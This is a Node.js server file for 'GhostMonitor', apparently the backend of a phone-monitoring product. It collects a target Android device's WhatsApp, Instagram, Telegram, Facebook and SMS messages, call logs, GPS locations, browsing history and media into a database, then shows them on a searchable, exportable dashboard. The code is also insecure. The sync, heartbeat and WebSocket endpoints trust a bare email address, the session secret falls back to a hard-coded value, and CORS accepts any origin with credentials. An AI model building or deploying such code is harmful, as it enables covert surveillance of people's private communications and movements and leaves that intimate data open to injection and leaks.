const express    = require('express');
const session    = require('express-session');
const cors       = require('cors');
const compression = require('compression');
const bcrypt     = require('bcryptjs');
const mysql      = require('mysql2/promise');
const zlib       = require('zlib');
const http       = require('http');
const WebSocket  = require('ws');
const path       = require('path');

const app    = express();
const server = http.createServer(app);
const wss    = new WebSocket.Server({ server });

// ── DB pool ───────────────────────────────────────────────────────────────────
const db = mysql.createPool({
    host:               process.env.DB_HOST,
    user:               process.env.DB_USER,
    password:           process.env.DB_PASS,
    database:           process.env.DB_NAME,
    port:               parseInt(process.env.DB_PORT || '3306'),
    waitForConnections: true,
    connectionLimit:    10,
    ssl: process.env.DB_SSL === 'true' ? { rejectUnauthorized: false } : undefined
});

// ── Middleware ────────────────────────────────────────────────────────────────
app.use(compression());
app.use(cors({
    origin: true,
    credentials: true
}));
app.use(express.json({ limit: '10mb' }));
app.use(express.raw({ type: 'application/octet-stream', limit: '10mb' }));
app.use(session({
    secret:            process.env.SESSION_SECRET || 'ghostmonitor_secret_2024',
    resave:            false,
    saveUninitialized: false,
    cookie: {
        secure:   process.env.NODE_ENV === 'production',
        httpOnly: true,
        maxAge:   24 * 60 * 60 * 1000 // 24h
    }
}));

// Serve the web dashboard static files
app.use(express.static(path.join(__dirname, 'public')));

// ── WebSocket — real-time device status ──────────────────────────────────────
// Map: parent_email → Set of WebSocket clients
const dashboardClients = new Map();

wss.on('connection', (ws, req) => {
    // Client sends { type: 'subscribe', email: '...' } after connecting
    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg);
            if (data.type === 'subscribe' && data.email) {
                ws.subscribedEmail = data.email;
                if (!dashboardClients.has(data.email)) {
                    dashboardClients.set(data.email, new Set());
                }
                dashboardClients.get(data.email).add(ws);
                console.log(`[WS] Dashboard subscribed for ${data.email}`);
            }
        } catch {}
    });
    ws.on('close', () => {
        if (ws.subscribedEmail && dashboardClients.has(ws.subscribedEmail)) {
            dashboardClients.get(ws.subscribedEmail).delete(ws);
        }
    });
});

function broadcastDeviceStatus(parentEmail, deviceId, status) {
    const clients = dashboardClients.get(parentEmail);
    if (!clients) return;
    const msg = JSON.stringify({ type: 'device_status', deviceId, status });
    clients.forEach(ws => {
        if (ws.readyState === WebSocket.OPEN) ws.send(msg);
    });
}

// ── Auth middleware ───────────────────────────────────────────────────────────
function requireAuth(req, res, next) {
    if (!req.session?.parentEmail) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
}

// ── POST /api/auth/login ──────────────────────────────────────────────────────
app.post('/api/auth/login', async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) return res.json({ success: false, message: 'Missing credentials' });

    try {
        const [rows] = await db.execute(
            "SELECT * FROM licenses WHERE parent_email = ? AND status = 'active'",
            [email.toLowerCase().trim()]
        );
        const user = rows[0];
        if (!user || !await bcrypt.compare(password, user.password_hash)) {
            return res.json({ success: false, message: 'Invalid credentials or inactive account' });
        }

        req.session.parentEmail = user.parent_email;

        // Update login history
        const history = user.login_history ? JSON.parse(user.login_history) : [];
        history.push({ ip: req.ip, time: new Date().toISOString(), ua: req.headers['user-agent'] });
        await db.execute(
            'UPDATE licenses SET login_history = ? WHERE parent_email = ?',
            [JSON.stringify(history.slice(-10)), user.parent_email]
        );

        res.json({ success: true });
    } catch (e) {
        console.error('[login]', e.message);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// ── GET /api/auth/logout ──────────────────────────────────────────────────────
app.get('/api/auth/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// ── GET /api/auth/check ───────────────────────────────────────────────────────
app.get('/api/auth/check', (req, res) => {
    res.json({ logged_in: !!req.session?.parentEmail });
});

// ── POST /api/verify-email  (called by Android app during setup) ──────────────
app.post('/api/verify-email', async (req, res) => {
    const email = (req.body.email || '').toLowerCase().trim();
    if (!email) return res.status(400).json({ valid: false, message: 'Email required' });

    try {
        const [rows] = await db.execute(
            'SELECT id, status FROM licenses WHERE parent_email = ?',
            [email]
        );
        const row = rows[0];
        if (!row) return res.json({ valid: false, message: 'Email not registered. Contact admin.' });
        if (row.status !== 'active') return res.json({ valid: false, message: `Account is ${row.status}. Contact admin.` });
        res.json({ valid: true });
    } catch (e) {
        console.error('[verify-email]', e.message);
        res.status(500).json({ valid: false, message: 'Server error' });
    }
});

// ── POST /api/sync  (called by Android app to upload packets) ─────────────────
app.post('/api/sync', async (req, res) => {
    const parentEmail = (req.query.parent_email || req.headers['x-parent-email'] || '').trim();
    const deviceId    = (req.query.device_id    || req.headers['x-device-id']    || '').trim();

    if (!parentEmail || !deviceId) {
        return res.status(400).json({ error: 'Missing credentials' });
    }

    // Verify email is registered
    try {
        const [rows] = await db.execute(
            "SELECT id FROM licenses WHERE parent_email = ? AND status = 'active'",
            [parentEmail]
        );
        if (!rows.length) return res.status(403).json({ error: 'Email not registered or inactive' });
    } catch (e) {
        return res.status(500).json({ error: 'DB error' });
    }

    // Decode body — raw bytes, try gzip first
    let raw = req.body;
    if (!Buffer.isBuffer(raw)) raw = Buffer.from(raw);
    if (!raw.length) return res.status(400).json({ error: 'Empty body' });

    let jsonStr;
    try {
        jsonStr = zlib.gunzipSync(raw).toString('utf8');
    } catch {
        jsonStr = raw.toString('utf8');
    }

    let packets;
    try {
        packets = JSON.parse(jsonStr);
    } catch {
        return res.status(400).json({ error: 'Invalid JSON payload' });
    }

    if (!Array.isArray(packets) || !packets.length) {
        return res.status(400).json({ error: 'Empty packet array' });
    }

    let inserted = 0, errors = 0;

    for (const p of packets) {
        try {
            const appType = (p.appType || '').toUpperCase();
            const ts      = p.timestamp ? parseInt(p.timestamp) : Date.now();

            if (appType === 'LOCATION') {
                const loc = typeof p.content === 'string' ? JSON.parse(p.content) : (p.content || {});
                const lat = parseFloat(loc.lat);
                const lng = parseFloat(loc.lng);
                const acc = parseFloat(loc.accuracy) || null;
                if (!isNaN(lat) && !isNaN(lng)) {
                    await db.execute(
                        'INSERT INTO locations (device_id, parent_email, lat, lng, accuracy, timestamp) VALUES (?,?,?,?,?,?)',
                        [deviceId, parentEmail, lat, lng, acc, ts]
                    );
                    inserted++;
                }
            } else {
                const content   = p.content != null ? (typeof p.content === 'string' ? p.content : JSON.stringify(p.content)) : null;
                const mediaMeta = p.mediaMeta ? JSON.stringify(p.mediaMeta) : null;
                const direction = ['SENT','RECEIVED'].includes((p.direction||'').toUpperCase()) ? p.direction.toUpperCase() : 'RECEIVED';

                await db.execute(
                    `INSERT INTO conversations
                     (device_id, parent_email, app_type, contact_id, contact_name, thread_id, direction, content, media_meta, timestamp)
                     VALUES (?,?,?,?,?,?,?,?,?,?)`,
                    [deviceId, parentEmail, appType, p.contactId||'', p.contactName||'', p.threadId||null, direction, content, mediaMeta, ts]
                );
                inserted++;
            }
        } catch (e) {
            console.error('[sync packet]', e.message);
            errors++;
        }
    }

    // Update heartbeat
    try {
        await db.execute(
            'INSERT INTO devices (device_id, parent_email, last_seen) VALUES (?,?,NOW()) ON DUPLICATE KEY UPDATE last_seen=NOW()',
            [deviceId, parentEmail]
        );
        broadcastDeviceStatus(parentEmail, deviceId, 'online');
    } catch {}

    res.json({ success: true, inserted, errors });
});

// ── GET /api/heartbeat  (called by Android app every 60s) ────────────────────
app.get('/api/heartbeat', async (req, res) => {
    const parentEmail = (req.query.parent_email || req.headers['x-parent-email'] || '').trim();
    const deviceId    = (req.query.device_id    || req.headers['x-device-id']    || '').trim();
    if (!parentEmail || !deviceId) return res.status(400).json({ error: 'Missing credentials' });

    try {
        await db.execute(
            'INSERT INTO devices (device_id, parent_email, last_seen) VALUES (?,?,NOW()) ON DUPLICATE KEY UPDATE last_seen=NOW()',
            [deviceId, parentEmail]
        );
        broadcastDeviceStatus(parentEmail, deviceId, 'online');
        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// ── GET /api/license ──────────────────────────────────────────────────────────
app.get('/api/license', requireAuth, async (req, res) => {
    try {
        const [rows] = await db.execute(
            `SELECT DATEDIFF(expiry_date, NOW()) as days_remaining,
                    CASE WHEN DATEDIFF(expiry_date, NOW()) > 0 AND status='active' THEN 'Active' ELSE 'Expired/Blocked' END as status
             FROM licenses WHERE parent_email = ?`,
            [req.session.parentEmail]
        );
        res.json(rows[0] || { status: 'No License', days_remaining: 0 });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// ── GET /api/data ─────────────────────────────────────────────────────────────
app.get('/api/data', requireAuth, async (req, res) => {
    const email  = req.session.parentEmail;
    const type   = req.query.type   || 'overview';
    const action = req.query.action || '';

    try {
        // CSV export
        if (action === 'export') {
            const [rows] = await db.execute(
                `SELECT app_type, contact_name, content, direction,
                        FROM_UNIXTIME(timestamp/1000) as datetime
                 FROM conversations WHERE parent_email = ? ORDER BY timestamp DESC`,
                [email]
            );
            res.setHeader('Content-Type', 'text/csv');
            res.setHeader('Content-Disposition', `attachment; filename="ghostmonitor_${new Date().toISOString().slice(0,10)}.csv"`);
            res.write('App,Contact,Message,Direction,DateTime\n');
            rows.forEach(r => {
                const line = [r.app_type, r.contact_name, (r.content||'').substring(0,200).replace(/,/g,' '), r.direction, r.datetime];
                res.write(line.join(',') + '\n');
            });
            return res.end();
        }

        // Overview
        if (type === 'overview') {
            const [[stats]]  = await db.execute(
                `SELECT COUNT(*) as total_messages,
                        SUM(CASE WHEN app_type='CALLS' THEN 1 ELSE 0 END) as total_calls
                 FROM conversations WHERE parent_email=? AND FROM_UNIXTIME(timestamp/1000)>=CURDATE()`,
                [email]
            );
            const [[locStats]] = await db.execute(
                `SELECT COUNT(*) as location_updates FROM locations
                 WHERE parent_email=? AND FROM_UNIXTIME(timestamp/1000)>=CURDATE()`,
                [email]
            );
            const [devices] = await db.execute(
                `SELECT device_id, last_seen,
                        CASE WHEN last_seen >= DATE_SUB(NOW(), INTERVAL 3 MINUTE) THEN 'online' ELSE 'offline' END as status
                 FROM devices WHERE parent_email=? ORDER BY last_seen DESC`,
                [email]
            );
            return res.json({
                total_messages:   parseInt(stats.total_messages)   || 0,
                total_calls:      parseInt(stats.total_calls)      || 0,
                location_updates: parseInt(locStats.location_updates) || 0,
                devices
            });
        }

        // Messaging apps
        const appMap = { whatsapp:'WHATSAPP', instagram:'INSTAGRAM', telegram:'TELEGRAM', facebook:'FACEBOOK', sms:'SMS' };
        if (appMap[type]) {
            const appType = appMap[type];

            if (action === 'thread') {
                const contactId = req.query.contact_id || '';
                const [msgs] = await db.execute(
                    `SELECT id, direction, content, media_meta, FROM_UNIXTIME(timestamp/1000) as datetime, timestamp
                     FROM conversations WHERE parent_email=? AND app_type=? AND contact_id=?
                     ORDER BY timestamp ASC LIMIT 500`,
                    [email, appType, contactId]
                );
                return res.json({ messages: msgs });
            }

            const search = req.query.search || '';
            let q = `SELECT contact_id, contact_name, COUNT(*) as message_count,
                            MAX(timestamp) as last_ts, FROM_UNIXTIME(MAX(timestamp)/1000) as last_message_time,
                            (SELECT content FROM conversations c2 WHERE c2.parent_email=c.parent_email
                             AND c2.app_type=c.app_type AND c2.contact_id=c.contact_id
                             ORDER BY timestamp DESC LIMIT 1) as last_message
                     FROM conversations c WHERE parent_email=? AND app_type=?`;
            const params = [email, appType];
            if (search) { q += ' AND (contact_name LIKE ? OR contact_id LIKE ?)'; params.push(`%${search}%`, `%${search}%`); }
            q += ' GROUP BY contact_id, contact_name ORDER BY last_ts DESC LIMIT 200';
            const [contacts] = await db.execute(q, params);
            return res.json({ contacts });
        }

        // Calls
        if (type === 'calls') {
            const start = req.query.start ? new Date(req.query.start).getTime() : Date.now() - 86400000;
            const end   = req.query.end   ? new Date(req.query.end).getTime()   : Date.now();
            const [calls] = await db.execute(
                `SELECT contact_name, contact_id, direction, content,
                        FROM_UNIXTIME(timestamp/1000) as datetime, timestamp
                 FROM conversations WHERE parent_email=? AND app_type='CALLS'
                 AND timestamp BETWEEN ? AND ? ORDER BY timestamp DESC LIMIT 500`,
                [email, start, end]
            );
            return res.json({ calls });
        }

        // Location
        if (type === 'location' || type === 'locations') {
            const start = req.query.start ? new Date(req.query.start).getTime() : Date.now() - 86400000;
            const end   = req.query.end   ? new Date(req.query.end).getTime()   : Date.now();
            const [locations] = await db.execute(
                `SELECT lat, lng, accuracy, FROM_UNIXTIME(timestamp/1000) as datetime, timestamp
                 FROM locations WHERE parent_email=? AND timestamp BETWEEN ? AND ?
                 ORDER BY timestamp ASC LIMIT 1000`,
                [email, start, end]
            );
            return res.json({ locations });
        }

        // Browsing
        if (type === 'browsing') {
            const filter = req.query.filter || 'today';
            const since  = filter === 'week' ? Date.now() - 7*86400000 : filter === 'month' ? Date.now() - 30*86400000 : new Date().setHours(0,0,0,0);
            const [history] = await db.execute(
                `SELECT contact_name as title, content as url, FROM_UNIXTIME(timestamp/1000) as datetime, timestamp
                 FROM conversations WHERE parent_email=? AND app_type='BROWSING' AND timestamp>=?
                 ORDER BY timestamp DESC LIMIT 500`,
                [email, since]
            );
            return res.json({ history });
        }

        // Media
        if (type === 'media') {
            const [media] = await db.execute(
                `SELECT app_type, contact_name, media_meta, FROM_UNIXTIME(timestamp/1000) as datetime, timestamp
                 FROM conversations WHERE parent_email=? AND app_type='MEDIA' AND media_meta IS NOT NULL
                 ORDER BY timestamp DESC LIMIT 200`,
                [email]
            );
            return res.json({ media });
        }

        res.status(400).json({ error: 'Unknown type' });
    } catch (e) {
        console.error('[data]', e.message);
        res.status(500).json({ error: e.message });
    }
});

// ── Catch-all — serve dashboard SPA ──────────────────────────────────────────
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ── Start ─────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`GhostMonitor server running on port ${PORT}`));
